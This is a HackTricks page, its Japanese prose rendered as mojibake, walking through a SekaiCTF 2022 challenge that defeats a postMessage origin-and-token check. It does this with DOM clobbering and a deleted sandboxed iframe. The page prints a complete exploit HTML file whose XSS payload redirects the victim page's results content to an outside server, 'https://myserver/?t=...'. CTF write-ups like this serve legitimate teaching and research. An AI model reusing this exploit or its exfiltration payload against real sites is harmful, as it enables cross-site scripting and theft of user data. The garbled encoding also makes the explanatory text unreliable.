# SOPã‚’Iframesã§ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ - 2

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## SOP-2ã«ãŠã‘ã‚‹Iframes

ã“ã®[**ãƒãƒ£ãƒ¬ãƒ³ã‚¸**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)ã®[**è§£æ±ºç­–**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution)**ã§ã€** [**@Strellic\_**](https://twitter.com/Strellic\_)ã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨ä¼¼ãŸæ–¹æ³•ã‚’ææ¡ˆã—ã¦ã„ã¾ã™ã€‚ç¢ºèªã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
ã‚‚ã—å½¼ãŒãã†ã™ã‚Œã°ã€å½¼ã¯**`innerHTML`**ã§ã‚µãƒ‹ã‚¿ã‚¤ã‚ºãªã—ã«ãƒšãƒ¼ã‚¸ã«æ›¸ãè¾¼ã¾ã‚Œã‚‹HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æŒã¤**postmessage**ã‚’é€ä¿¡ã§ãã¾ã™ï¼ˆ**XSS**ï¼‰ã€‚

**æœ€åˆã®ãƒã‚§ãƒƒã‚¯**ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã¯ã€**`window.calc.contentWindow`**ã‚’**`undefined`**ã«ã—ã€**`e.source`**ã‚’**`null`**ã«ã™ã‚‹ã“ã¨ã§ã™ï¼š

* **`window.calc.contentWindow`**ã¯å®Ÿéš›ã«ã¯**`document.getElementById("calc")`**ã§ã™ã€‚ã‚ãªãŸã¯**`<img name=getElementById />`**ã§**`document.getElementById`**ã‚’ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã§ãã¾ã™ï¼ˆã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼API -[ã“ã¡ã‚‰](https://wicg.github.io/sanitizer-api/#dom-clobbering)-ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®çŠ¶æ…‹ã§DOMã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼æ”»æ’ƒã‹ã‚‰ä¿è­·ã™ã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼‰ã€‚
* ã—ãŸãŒã£ã¦ã€ã‚ãªãŸã¯**`<img name=getElementById /><div id=calc></div>`**ã§**`document.getElementById("calc")`**ã‚’ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã§ãã¾ã™ã€‚ãã†ã™ã‚‹ã¨ã€**`window.calc`**ã¯**`undefined`**ã«ãªã‚Šã¾ã™ã€‚
* ã•ã¦ã€**`e.source`**ã‚’**`undefined`**ã¾ãŸã¯**`null`**ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆãªãœãªã‚‰`==`ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**`null == undefined`**ã¯**`True`**ã§ã™ï¼‰ã€‚ã“ã‚Œã‚’å¾—ã‚‹ã®ã¯ã€Œç°¡å˜ã€ã§ã™ã€‚**iframe**ã‚’ä½œæˆã—ã€ãã“ã‹ã‚‰**postMessage**ã‚’é€ä¿¡ã—ã€ã™ãã«**iframe**ã‚’**å‰Šé™¤**ã™ã‚‹ã¨ã€**`e.origin`**ã¯**`null`**ã«ãªã‚Šã¾ã™ã€‚æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
**ãƒˆãƒ¼ã‚¯ãƒ³ã«é–¢ã™ã‚‹** **ç¬¬äºŒã®ãƒã‚§ãƒƒã‚¯**ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€**`token`**ã‚’å€¤`null`ã§é€ä¿¡ã—ã€**`window.token`**ã®å€¤ã‚’**`undefined`**ã«ã™ã‚‹ã“ã¨ã§ã™ï¼š

* å€¤`null`ã§postMessageã«`token`ã‚’é€ä¿¡ã™ã‚‹ã®ã¯ç°¡å˜ã§ã™ã€‚
* **`window.token`**ã¯ã€**`document.cookie`**ã‚’ä½¿ç”¨ã™ã‚‹é–¢æ•°**`getCookie`**ã‚’å‘¼ã³å‡ºã™éš›ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚**`null`**ã‚ªãƒªã‚¸ãƒ³ãƒšãƒ¼ã‚¸ã§ã®**`document.cookie`**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯**ã‚¨ãƒ©ãƒ¼**ã‚’å¼•ãèµ·ã“ã™ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**`window.token`**ã¯**`undefined`**ã®å€¤ã‚’æŒã¤ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

æœ€çµ‚çš„ãªè§£æ±ºç­–ã¯[**@terjanq**](https://twitter.com/terjanq)ã«ã‚ˆã‚‹ã‚‚ã®ã§ã€[**ä»¥ä¸‹**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html)ã§ã™ï¼š
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
